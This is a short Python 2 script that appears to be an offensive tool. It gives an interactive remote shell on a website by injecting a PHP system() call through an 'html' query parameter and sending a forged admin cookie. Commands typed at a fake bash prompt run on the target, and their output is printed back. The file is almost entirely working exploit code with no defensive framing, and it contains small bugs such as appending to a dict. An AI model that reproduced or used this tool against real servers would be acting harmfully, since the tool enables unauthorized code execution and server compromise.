import requests, socket, sys

class phpinj():
	def __init__(self, host, verbose=False):
		self.cookie = {"adminpowa":"anything"}
		self.defaulthost = host
		self.showc = None
		self.verbose = verbose
	
	def printcookie(self,c):
		if type(c) == dict:
			e = str(c)
			e = "\n".join(e.replace("}","").replace("{","").replace(":"," :").replace("'","").split(", "))
			print e
	
	def shellpayload(self,payload,target,c):
		r = requests.get("%s?html=<?php system(\""%(target)+payload+"\"); ?>", cookies=c, timeout=50)
		if self.verbose and r.text[r.text.find("</html>")+7:] != "\n":
			print
			print " [ ] Status Code:",r.status_code,"-",r.reason
			print " [ ] Time Elaped:",str(r.elapsed)
			print " [ ] Encoding:",r.encoding
			if self.showc == None or self.showc == True:
				if self.showc == True or raw_input(" [ ] Cookies & Headers [y/n] ") == "y":
					self.printcookie(dict(r.cookies))
					self.printcookie(dict(r.headers))
				elif self.showc != True or self.showc != None:
					self.showc = False
		else:
			return "[!] Invalid Command"
		html = r.text
		return html[html.find("</html>")+7:]
	
	def rse(self):
		print "Target Website",
		host = raw_input("")
		if not host.startswith("http"):
			host = "http://"+host
		if len(host) == 7:
			host = self.defaulthost
		print "[ %s ]" %host
		if raw_input("Cookies [y/n] ") == "y":
			while True:
				c = raw_input("")
				if len(c) == 0:
					break
				self.cookie.append({c.split()[0]:c.split()[1]})
		print "[+] Remote Shell Ready"
		while True:
			try:
				cmd = raw_input("[%s]::bash[$] "%host.split("//")[1])
				if cmd == "exit" or cmd == "quit":
					break
				data = self.shellpayload(cmd,host,self.cookie)
				if data != "\n":
					print data
			except Exception as e:
				print "\n[-]",e
				print

C = phpinj(target, verbose)
C.rse()
